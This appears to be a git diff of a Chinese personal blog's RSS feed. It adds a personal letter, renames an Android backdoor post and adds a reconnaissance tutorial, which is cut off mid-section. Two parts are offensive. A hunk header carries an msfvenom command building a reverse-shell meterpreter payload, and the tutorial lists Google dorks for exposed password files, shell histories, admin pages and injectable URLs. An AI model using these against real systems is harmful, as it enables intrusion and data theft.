@@ -6,8 +6,8 @@
     <description>欢迎来到我的个人站~</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 18 Aug 2023 15:26:53 +0800</pubDate>
-    <lastBuildDate>Fri, 18 Aug 2023 15:26:53 +0800</lastBuildDate>
+    <pubDate>Wed, 23 Aug 2023 07:23:25 +0800</pubDate>
+    <lastBuildDate>Wed, 23 Aug 2023 07:23:25 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
     
     <item>
@@ -809,7 +809,37 @@ X Y Z， X Y J, X Y K，X Y L，X Z J, X Z K，X Z L，X J K，X J L，X K L，Y
     </item>
     
     <item>
-      <title>Android 后门程序</title>
+      <title>刘写给清扬的信</title>
+      <description>&lt;h3 id=&quot;我搜寻程序的灵魂却找到一颗世上最滚烫的心&quot;&gt;我搜寻程序的灵魂，却找到一颗世上最滚烫的心。&lt;/h3&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;你那边阳光可好？&lt;/p&gt;
+
+&lt;p&gt;我这里光线有点暗，阴沉沉的。不过可喜的是，我已经适应了此时的天气。&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/12/刘写给清扬的信/&quot;&gt; 刘写给清扬的信 &lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+</description>
+      <pubDate>Tue, 06 Dec 2022 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2022/12/%E5%88%98%E5%86%99%E7%BB%99%E6%B8%85%E6%89%AC%E7%9A%84%E4%BF%A1/</link>
+      <guid isPermaLink="true">http://localhost:4000/2022/12/%E5%88%98%E5%86%99%E7%BB%99%E6%B8%85%E6%89%AC%E7%9A%84%E4%BF%A1/</guid>
+        
+      <category>人生</category>
+        
+        
+    </item>
+    
+    <item>
+      <title>H系列 - Android 后门程序</title>
       <description>&lt;h3 id=&quot;纵然时光相隔百年仍感你心近在咫尺&quot;&gt;纵然时光相隔百年，仍感你心近在咫尺。&lt;/h3&gt;
 
 &lt;h2 id=&quot;kali-linux利用msf入侵安卓手机&quot;&gt;Kali Linux利用MSF入侵安卓手机&lt;/h2&gt;
@@ -972,196 +1002,328 @@ msfvenom -p python/meterpreter/reverser_tcp LHOST=控制机ip LPORT=控制机端
 &lt;br /&gt; 
 &lt;br /&gt; 
 &lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/11/android后门程序/&quot;&gt; Android 后门程序 &lt;/a&gt;&lt;br /&gt;
+转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/11/H系列 - Android 后门程序/&quot;&gt; H系列 - Android 后门程序 &lt;/a&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 </description>
       <pubDate>Wed, 23 Nov 2022 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2022/11/android%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/</link>
-      <guid isPermaLink="true">http://localhost:4000/2022/11/android%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/</guid>
+      <link>http://localhost:4000/2022/11/H%E7%B3%BB%E5%88%97-Android-%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/</link>
+      <guid isPermaLink="true">http://localhost:4000/2022/11/H%E7%B3%BB%E5%88%97-Android-%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/</guid>
         
-      <category>技术</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>FFmpeg</title>
-      <description>&lt;h3 id=&quot;我的嘴角上扬和月亮肩并肩&quot;&gt;我的嘴角上扬，和月亮肩并肩。&lt;/h3&gt;
-
-&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
-
-&lt;p&gt;FFmpeg是一个开源的跨平台多媒体框架，它可以用于处理音频、视频和多媒体流。它提供了一组强大的工具和库，可以用于音视频的录制、转码、编辑、流媒体和播放等操作。&lt;/p&gt;
-
-&lt;p&gt;以下是FFmpeg的一些主要特点和功能：&lt;/p&gt;
-
-&lt;p&gt;格式支持：FFmpeg支持广泛的音视频格式，包括常见的MP4、AVI、MKV、MP3、AAC等，以及更多的专有格式和编解码器。它可以读取和写入不同格式之间的转换。&lt;/p&gt;
-
-&lt;p&gt;编解码器：FFmpeg包含众多音视频编解码器，可以对音频和视频进行解码和编码。这使得它可以处理不同编码格式的媒体文件，并实现高效的压缩和解压缩。&lt;/p&gt;
-
-&lt;p&gt;滤镜和特效：FFmpeg提供了丰富的滤镜和特效，可以对音频和视频进行处理和改善。例如，你可以应用图像调整、色彩校正、降噪、模糊、剪裁等效果，以及音频均衡器、混响、消除噪声等处理。&lt;/p&gt;
-
-&lt;p&gt;转码和转换：FFmpeg可以将一个媒体文件转换为另一种格式或编码方式，实现音视频的转码和转换。你可以调整分辨率、帧率、比特率等参数，以满足不同的需求。&lt;/p&gt;
-
-&lt;p&gt;流媒体：FFmpeg支持音视频的实时流媒体传输，可以将音视频内容通过网络进行直播或点播。它可以与流媒体服务器配合使用，如RTMP、HLS、UDP等，实现音视频的传输和分发。&lt;/p&gt;
-
-&lt;p&gt;命令行工具：FFmpeg提供了命令行工具，可以通过命令行界面执行各种音视频处理任务。这使得它非常适合自动化和批处理操作。&lt;/p&gt;
-
-&lt;p&gt;除了上述功能之外，FFmpeg还具有很好的跨平台性，可在多个操作系统上运行，包括Windows、Mac OS、Linux等。它还有一个活跃的开发社区，不断更新和改进功能。&lt;/p&gt;
-
-&lt;h2 id=&quot;安装查看&quot;&gt;安装查看&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//安装
-brew install ffmpeg
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//版本信息
-ffmpeg -version  
-
-结果：
-ffmpeg version 6.0 Copyright (c) 2000-2023 the FFmpeg developers
-built with Apple clang version 14.0.0 (clang-1400.0.29.202)
-configuration: --prefix=/usr/local/Cellar/ffmpeg/6.0 --enable-shared --enable-pthreads --enable-version3 --cc=clang --host-cflags= --host-ldflags= --enable-ffplay --enable-gnutls --enable-gpl --enable-libaom --enable-libaribb24 --enable-libbluray --enable-libdav1d --enable-libmp3lame --enable-libopus --enable-librav1e --enable-librist --enable-librubberband --enable-libsnappy --enable-libsrt --enable-libsvtav1 --enable-libtesseract --enable-libtheora --enable-libvidstab --enable-libvmaf --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxml2 --enable-libxvid --enable-lzma --enable-libfontconfig --enable-libfreetype --enable-frei0r --enable-libass --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-libopenjpeg --enable-libspeex --enable-libsoxr --enable-libzmq --enable-libzimg --disable-libjack --disable-indev=jack --enable-videotoolbox
-libavutil      58.  2.100 / 58.  2.100
-libavcodec     60.  3.100 / 60.  3.100
-libavformat    60.  3.100 / 60.  3.100
-libavdevice    60.  1.100 / 60.  1.100
-libavfilter     9.  3.100 /  9.  3.100
-libswscale      7.  1.100 /  7.  1.100
-libswresample   4. 10.100 /  4. 10.100
-libpostproc    57.  1.100 / 57.  1.100
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;使用&quot;&gt;使用&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;查看文件信息&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;示例:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffmpeg -i /Users/liuqiang/Desktop/我的歌声里.mp3  
-
-结果：  
-ffmpeg version 6.0 Copyright (c) 2000-2023 the FFmpeg developers
-  built with Apple clang version 14.0.0 (clang-1400.0.29.202)
-  configuration: --prefix=/usr/local/Cellar/ffmpeg/6.0 --enable-shared --enable-pthreads --enable-version3 --cc=clang --host-cflags= --host-ldflags= --enable-ffplay --enable-gnutls --enable-gpl --enable-libaom --enable-libaribb24 --enable-libbluray --enable-libdav1d --enable-libmp3lame --enable-libopus --enable-librav1e --enable-librist --enable-librubberband --enable-libsnappy --enable-libsrt --enable-libsvtav1 --enable-libtesseract --enable-libtheora --enable-libvidstab --enable-libvmaf --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxml2 --enable-libxvid --enable-lzma --enable-libfontconfig --enable-libfreetype --enable-frei0r --enable-libass --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-libopenjpeg --enable-libspeex --enable-libsoxr --enable-libzmq --enable-libzimg --disable-libjack --disable-indev=jack --enable-videotoolbox
-  libavutil      58.  2.100 / 58.  2.100
-  libavcodec     60.  3.100 / 60.  3.100
-  libavformat    60.  3.100 / 60.  3.100
-  libavdevice    60.  1.100 / 60.  1.100
-  libavfilter     9.  3.100 /  9.  3.100
-  libswscale      7.  1.100 /  7.  1.100
-  libswresample   4. 10.100 /  4. 10.100
-  libpostproc    57.  1.100 / 57.  1.100
-Input #0, mp3, from '/Users/liuqiang/Desktop/我的歌声里.mp3':
-  Metadata:
-    major_brand     : mp42
-    minor_version   : 0
-    compatible_brands: M4A mp42isom
-    title           : 我的歌声里
-    album           : Everything In The World
-    artist          : 曲婉婷
-    iTunSMPB        :  00000000 00000A40 0000006C 000000000091C554 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
-    encoder         : Lavf60.3.100
-  Duration: 00:03:36.66, start: 0.025057, bitrate: 128 kb/s
-  Chapters:
-    Chapter #0:0: start 0.000000, end 216.689000
-      Metadata:
-        title           : 我的歌声里
-  Stream #0:0: Audio: mp3, 44100 Hz, stereo, fltp, 128 kb/s
-    Metadata:
-      encoder         : Lavc60.3.
-At least one output file must be specified
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;文件编码格式转换&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//将M4A格式的音频文件转换为MP3格式
-ffmpeg -i input.m4a -acodec mp3 -vn output.mp3  
-
-//其中，input.m4a是要转换的M4A文件的路径和文件名，output.mp3是转换后的MP3文件的路径和文件名。您可以根据需要自定义文件名和路径。  
-//示例:   
-ffmpeg -i /Users/liuqiang/Desktop/我的歌声里.m4a  -acodec mp3 -vn /Users/liuqiang/Desktop/我的歌声里.mp3 
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//转成 H.264 编码
-ffmpeg -i out.mp4 -c:v libx264 output.mp4
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//转成 H.265 编码
-ffmpeg -i out.mp4 -c:v libx265 output.mp4
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;音视频提取&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//提取音频
-ffmpeg -i origin.mp4 -acodec copy -vn voice.aac
-
-解释：ffmpeg -i 原始视频文件 -acodec copy -vn 输出音频文件
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 提取视频
-ffmpeg -i origin.mp4 -vcodec copy -an video0.mp4
-
-解释：ffmpeg -i 原始视频文件 -acodec copy -vn 输出视频文件
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/09/FFmpeg/&quot;&gt; FFmpeg &lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Mon, 12 Sep 2022 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2022/09/FFmpeg/</link>
-      <guid isPermaLink="true">http://localhost:4000/2022/09/FFmpeg/</guid>
-        
-      <category>技术</category>
+      <category>H系列</category>
         
         
     </item>
     
     <item>
-      <title>我,为什么要努力?</title>
-      <description>&lt;h3 id=&quot;我变成荒凉的景象-变成无所谓的模样&quot;&gt;我变成荒凉的景象 变成无所谓的模样&lt;/h3&gt;
+      <title>H系列 - 信息收集_搜索引擎</title>
+      <description>&lt;h3 id=&quot;极盛之秋我只取一叶&quot;&gt;极盛之秋，我只取一叶。&lt;/h3&gt;
 
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;在信息收集中搜索引擎能够提供给我们很大的帮助几乎很大的程度的帮助都来自于搜索引擎而普遍的搜索引擎有google-hackingshodanfofazoomeye&quot;&gt;&lt;strong&gt;在信息收集中，搜索引擎能够提供给我们很大的帮助，几乎很大的程度的帮助都来自于搜索引擎，而普遍的搜索引擎有：Google Hacking、Shodan、FOFA、ZoomEye&lt;/strong&gt;&lt;/h2&gt;
 
-&lt;p&gt;小时候，我想要吃的，喝的，玩的，我想要被重视，我想要得到爱，所以努力学习，努力听话，努力成为别人家的孩子。&lt;/p&gt;
+&lt;h2 id=&quot;google-hacking&quot;&gt;&lt;strong&gt;Google Hacking&lt;/strong&gt;&lt;/h2&gt;
 
-&lt;p&gt;后来，我要努力学习，改变命运，去挣很多钱，那些被奉为无比重要的，甚至视为生命的金钱，然后去挥霍，告诉那些人钱是王八蛋，我不care。&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Google Hacking 是一种利用 Google 搜索引擎的高级搜索技巧，用于发现网络上的敏感信息、漏洞、未经授权的资源等。
+虽然 Google 是一个功能强大的搜索引擎，但它不仅仅可以用来搜索常规的网页内容，还可以通过一些特定的搜索查询暴露出网站、
+服务器和应用程序中的潜在安全问题。这些技巧通常需要使用一些特殊的搜索语法和运算符，以便更有针对性地搜索特定类型的信息。
 
-&lt;p&gt;后来，我要努力挣钱，挣钱买房，买车，有一定存款，这样才会有物质基础，生活保障，有信心去爱一个人，有面子去娶一个人。&lt;/p&gt;
+Google Hacking 可能涉及以下几个方面：
 
-&lt;p&gt;后来，我不想努力了。我问自己，为什么要努力？我贴在墙上，一遍遍的看，似乎可以看到答案，似乎看到了答案，似乎什么都没有看到。&lt;/p&gt;
+敏感信息泄露： 通过搜索特定关键词、文件类型或特定网站，攻击者可能会发现包含敏感信息（如密码、信用卡号、社会安全号码等）的文件。
 
-&lt;p&gt;后来，我不努力了。我觉得我看透了社会的本质，看清了努力的现实，看透了人心，看穿了宇宙。我不想成为蛋糕被切分，不想作为鱼肉立于案板，不想虚假，不想渺小。&lt;/p&gt;
+目录遍历和文件泄露： 搜索特定网站或服务器上的文件目录，可能会暴露未经授权的文件、备份或其他敏感数据。
 
-&lt;p&gt;后来，我突然抬起头，再一次看了看贴在墙上的他。&lt;/p&gt;
+漏洞信息发现： 攻击者可以搜索特定的应用程序、服务或软件的错误页面，从中获得关于已知漏洞或弱点的信息。
+
+未授权访问检测： 通过搜索特定网站或服务的登录页面，攻击者可以尝试使用默认的用户名和密码进行登录，以获得未授权访问权限。
+
+设备暴露： 攻击者可以搜索网络摄像头、路由器管理页面等，以获取未经授权的设备访问权限。
+
+应用程序版本检测： 通过搜索特定应用程序的版本信息，攻击者可以发现目标可能存在的已知漏洞。
+
+敏感文件搜索：
+查询：filetype:pdf site:example.com confidential
+描述：搜索特定网站上的PDF文件中包含&quot;confidential&quot;的敏感信息。
+
+
+目录遍历检测：
+查询：intitle:index.of site:example.com
+描述：查找指定网站上目录列表，可能暴露敏感文件。
+
+
+未授权访问检测：
+查询：intitle:&quot;Test Page for Apache&quot; site:example.com
+描述：搜索是否存在未经授权的Apache测试页面。
+
+
+漏洞信息搜索：
+查询：intitle:&quot;Welcome to phpMyAdmin&quot; inurl:phpmyadmin site:example.com
+描述：搜索网站上的phpMyAdmin页面，可能暴露数据库管理页面。
+
+
+登录页面绕过尝试：
+查询：inurl:admin login site:example.com
+描述：搜索网站上可能存在的管理员登录页面。
+
+
+网络摄像头搜索：
+查询：inurl:ViewerFrame?Mode= site:example.com
+描述：搜索网络摄像头页面，可能未经授权公开了视频流。
+
+
+未加密数据搜索：
+查询：insecure ext:csv site:example.com
+描述：搜索网站上未加密的CSV文件，可能包含敏感数据。
+
+
+
+
+高级搜索 相关
+
+intext:
+寻找正文中含有关键字的网页，例如： intext:后台登录 将只返回正文中包含 后台登录 的网页
+
+
+intitle:
+寻找标题中含有关键字的网页，例如： intitle:后台登录 将只返回标题中包含 后台登录 的网页，intitle:后台登录 密码 将返回标题中包含黑客而正文中包含中国的网页
+
+
+allintitle:
+用法和intitle类似，只不过可以指定多个词，例如： alltitle:后台登录 管理员 将返回标题中包含黑客 和中国的网页
+
+
+inurl：
+将返回url中含有关键词的网页：例如：inurl:Login 将返回url中含有 Login 的网页
+
+
+查找管理员登录页面
+inurl:/admin/login.php
+
+查找后台数据库管理页面
+inurl:/phpmyadmin/index.php
+
+allinurl:
+用法和inurl类似，只不过可以指定多个词，例如：inurl:Login admin 将返回url中含有 Login 和 admin 的网页
+
+
+site:
+指定访问的站点，例如： site:http://baidu.com inurl:Login 将只在http://baidu.com 中查找url中含有 Login的网页
+
+
+filetype:
+指定访问的文件类型，例如：site:http://baidu.com filetype:pdf 将只返回http://baidu.com站点上文件类型为pdf的网页
+
+
+link:
+指定链接的网页，例如：link:http://www.baidu.com 将返回所有包含指向 http://www.baidu.com 的网页
+
+
+related:
+相似类型的网页，例如：related:http://www.xjtu.edu.cn 将返回与 http://www.xjtu.edu.cn 相似的页面，相似指的是网页的布局相似
+
+
+cache:
+网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:http://www.hackingspirits.com guest ，将返回指定网站的缓存，并且正文中含有guest
+
+info:
+返回站点的指定信息，例如：info:http://www.baidu.com 将返回百度的一些信息
+
+define:
+返回某个词语的定义，例如：define:Hacker　　将返回关于Hacker的定义
+
+phonebook:
+电话簿查询美国街道地址和电话号码信息。例如：phonebook:Lisa+CA 将返回名字里面包含Lisa并住在加州的人的所有名字
+
+查找网站后台
+site:http://xx.com intext:管理
+site:http://xx.com inurl:login
+site:http://xx.com intitle:后台
+
+查看服务器使用的程序
+site:http://xx.com filetype:asp
+site:http://xx.com filetype:php
+site:http://xx.com filetype:jsp
+site:http://xx.com filetype:aspx
+
+查看上传漏洞
+site:http://xx.com inurl:file
+site:http://xx.com inurl:load
+
+
+Index of
+利用 Index of 语法去发现允许目录浏览的web网站，就像在本地的普通目录一样。下面是一些有趣的查询：
+index of /admin
+index of /passwd
+index of /password
+index of /mail
+&quot;index of /&quot; +passwd
+&quot;index of /&quot; +password.txt
+&quot;index of /&quot; +.htaccess
+&quot;index of /root&quot;
+&quot;index of /cgi-bin&quot;
+&quot;index of /logs&quot;
+&quot;index of /config&quot;
+
+inurl
+而上面这些命令中用的最多的就是 inurl: 了，利用这个命令，可以查到很多意想不到的东西
+
+利用 allinurl:winnt/system32/ 查询：列出的服务器上本来应该受限制的诸如“system32” 等目录，如果你运气足够好，你会发现“system32” 目录里的“cmd.exe” 文件，并能执行他，接下来就是提升权限并攻克了。
+查询 allinurl:wwwboard/passwd.txt 将列出所有有“WWWBoard Password vulnerability”漏洞的服务器，阅读更多请参见下面链接。
+查询 inurl:.bash_history 将列出互联网上可以看见 “inurl:.bash_history” 文件的服务器。这是一个命令历史文件，这个文件包含了管理员执行的命令，有时会包含一些敏感信息比如管理员键入的密码。
+查询 inurl:config.txt 将看见网上暴露了“inurl:config.txt”文件的服务器，这个文件包含了经过哈希编码的管理员的密码和数据库存取的关键信息。
+
+还有一些其他一些使用“inurl:”和“allinurl:”查询组合的例子
+inurl:admin filetype:txt
+inurl:admin filetype:db
+inurl:admin filetype:cfg
+inurl:mysql filetype:cfg
+inurl:passwd filetype:txt
+inurl:”wwwroot/*.”
+inurl:adpassword.txt
+inurl:webeditor.php
+inurl:file_upload.php
+inurl:gov filetype:xls “restricted”
+index of ftp +.mdb allinurl:/cgi-bin/ +mailto
+
+查找有可能存在SQL注入的网站
+inurl:id=1
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;shodan&quot;&gt;&lt;strong&gt;Shodan&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Shodan 是一种专门用于搜索和获取与互联网上连接的设备和系统相关信息的搜索引擎，它是一种网络空间情报工具。与传统的搜索引擎（如 Google）不同，Shodan 不是搜索网页内容，而是搜索与互联网连接的设备的信息，这些设备可能包括服务器、路由器、摄像头、物联网设备等。
+
+以下是 Shodan 的一些特点和功能：
+
+设备信息获取： Shodan 可以搜索并获取连接到互联网的设备的信息，包括设备类型、操作系统、开放的端口、服务和应用程序等。
+
+漏洞和弱点检测： Shodan 可以帮助安全专业人员和黑客发现设备和系统中的漏洞和弱点。它可以搜索未经授权的访问、默认密码、未更新的软件版本等。
+
+智能搜索： Shodan 允许用户使用高级搜索运算符来缩小搜索范围，从而更精确地找到目标设备和信息。
+
+地理定位： Shodan 可以通过 IP 地址获取设备的地理位置信息，这对于定位特定地区的设备非常有用。
+
+物联网设备搜索： Shodan 对于搜索物联网设备尤为强大，可以找到连接到互联网的各种智能设备，如摄像头、智能家居设备等。
+
+数据泄露检测： Shodan 可以帮助用户发现可能因配置错误或安全漏洞导致的数据泄露情况。
+
+Shodan 是一个功能强大的网络情报工具，可以用于搜索并获取连接到互联网的设备和系统的信息。下面是使用 Shodan 的基本步骤：
+
+注册账号： 首先，你需要在 Shodan 的官方网站（https://www.shodan.io/）上注册一个账号。一些基本功能可以免费使用，但高级功能可能需要付费订阅。
+
+登录： 使用你的账号登录到 Shodan。
+
+进行搜索： 在 Shodan 的搜索栏中输入你感兴趣的关键词、IP 地址、设备类型等信息，然后点击搜索按钮。例如，你可以搜索特定设备类型（如路由器、摄像头）、操作系统类型、开放的端口等。
+
+使用高级搜索运算符： 如果你想更精确地搜索特定的设备或信息，可以使用 Shodan 的高级搜索运算符。例如，你可以使用 &quot;port:&quot; 运算符指定特定的端口号，或使用 &quot;hostname:&quot; 运算符指定特定的主机名。
+
+浏览搜索结果： Shodan 将返回与你的搜索条件匹配的设备信息列表。你可以浏览这些结果，查看设备类型、IP 地址、开放的端口、所在地等信息。
+
+查看设备详情： 点击搜索结果中的特定设备，你将能够查看有关该设备的更多详细信息，包括开放的端口和服务、地理位置、漏洞信息等。
+
+使用 Shodan Exploits： Shodan 还提供了一个名为 &quot;Exploits&quot; 的功能，用于查找与特定设备或服务相关的已知漏洞。你可以使用这个功能来检查设备是否受到已公开的漏洞威胁。
+
+使用 Shodan API： 如果你是开发人员或需要自动化查询和集成 Shodan 数据，可以使用 Shodan 提供的 API。通过 API，你可以编写脚本来获取特定信息或监控特定设备。
+
+保持法律和道德准则： 在使用 Shodan 或类似的工具时，务必遵守法律和道德规范。不要使用这些工具进行非法的渗透测试、侵犯隐私或其他恶意活动。
+
+总之，Shodan 是一个有用的网络情报工具，但在使用时务必谨慎，遵循合法和道德的原则。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;fofa&quot;&gt;&lt;strong&gt;FOFA&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FOFA（Fingerprinting Organizations with Collected Archives）是一个网络搜索引擎，专注于搜索和收集与互联网上的设备、服务和技术有关的信息。FOFA 可以帮助安全研究人员、渗透测试人员和其他 IT 专业人员发现潜在的目标和漏洞，以及获取有关互联网上各种资源的信息。
+
+以下是 FOFA 的一些主要特点和用途：
+
+精确搜索： FOFA 提供了一系列高级搜索运算符，使用户能够精确搜索特定类型的设备、服务、操作系统、开放的端口等。
+
+设备指纹识别： FOFA 可以根据设备的指纹信息识别设备类型、制造商和模型，这有助于更准确地定位目标。
+
+漏洞探测： 用户可以使用 FOFA 来搜索存在已知漏洞的设备或服务，从而评估其安全性。
+
+数据导出： FOFA 支持将搜索结果导出为 CSV 格式，方便进一步分析和处理。
+
+API 访问： FOFA 提供了 API 访问，用户可以通过编程方式自动化查询和获取数据。
+
+监控： 用户可以设置监控规则，当符合条件的目标出现时，FOFA 会发送通知，有助于实时跟踪特定设备或服务的变化。
+
+定制报告： FOFA 提供了生成定制化报告的功能，用户可以将搜索结果转化为易于理解的报告格式。
+
+漏洞挖掘： 安全研究人员可以使用 FOFA 来发现公开可访问的漏洞利用目标。
+
+互联网情报收集： FOFA 可以用于收集有关组织、域名、IP 地址等在互联网上公开可访问的信息。
+
+以下是使用 FOFA 的一般步骤：
+
+访问 FOFA 网站： 打开您的浏览器，访问 FOFA 的官方网站（https://fofa.so/）。
+
+创建账户： 如果您没有 FOFA 账户，需要先创建一个账户。这可能需要您提供一些基本信息并遵守使用条款。
+
+登录账户： 使用您的凭据登录到 FOFA 账户。
+
+执行搜索： 在 FOFA 的搜索栏中，您可以输入搜索查询，可以是关键词、IP 地址、域名、特定的端口等。您还可以使用高级搜索运算符来精确指定搜索条件。例如，您可以搜索特定操作系统、设备类型、开放的端口等。
+
+分析搜索结果： FOFA 将根据您的搜索条件返回相应的结果。您可以查看每个结果的详细信息，包括设备类型、IP 地址、端口、指纹信息等。
+
+导出数据： 如果您想进一步分析或保存搜索结果，您可以选择将结果导出为 CSV 文件，以便在电子表格应用程序中打开。
+
+创建监控规则（可选）： 如果您希望实时跟踪特定条件下的目标，您可以创建监控规则。当符合规则条件的新目标出现时，您将收到通知。
+
+使用 API（可选）： 如果您想在自己的应用程序中集成 FOFA 数据，您可以使用 FOFA 的 API 访问数据。这需要一些编程知识。
+
+生成报告（可选）： 如果您需要将搜索结果生成报告，FOFA 提供了报告生成功能，以便您可以以易于理解的格式分享信息。
+
+值得强调的是，FOFA 数据库中包含了许多互联网上的公开信息，但在使用 FOFA 进行搜索时，务必遵守适用的法律和道德准则。未经授权地访问、操纵或利用他人的设备、系统或信息是违法行为。使用 FOFA 时，请始终确保您的活动是合法和道德的。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;zoomeye&quot;&gt;&lt;strong&gt;ZoomEye&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ZoomEye（中文名：钟馗之眼）是一个网络搜索引擎，专注于搜索和识别与互联网上的设备、服务、漏洞等相关的信息。它与其他类似的工具相比，更加关注网络安全领域，提供了丰富的信息来帮助安全专业人员进行威胁情报收集和漏洞分析。
+
+ZoomEye 的特点：
+
+网络设备搜索： ZoomEye 可以搜索互联网上的各种设备，包括服务器、路由器、摄像头等，帮助您发现潜在的安全风险。
+服务和端口扫描： ZoomEye 可以扫描公开的网络服务和开放的端口，帮助您发现未安全配置的服务和暴露的端口。
+漏洞搜索： ZoomEye 可以搜索已知漏洞的相关信息，帮助您识别可能受到攻击的目标。
+Web 应用识别： ZoomEye 可以检测和识别互联网上的 Web 应用程序，包括 CMS、框架等。
+自定义搜索： 您可以使用高级搜索运算符来精确指定搜索条件，从而获取更准确的结果。
+使用 ZoomEye 的一般步骤：
+
+访问 ZoomEye 网站： 打开您的浏览器，访问 ZoomEye 的官方网站（https://www.zoomeye.org/）。
+
+创建账户： 如果您没有 ZoomEye 账户，您需要注册并创建一个账户。您可能需要提供一些基本信息，并同意使用条款。
+
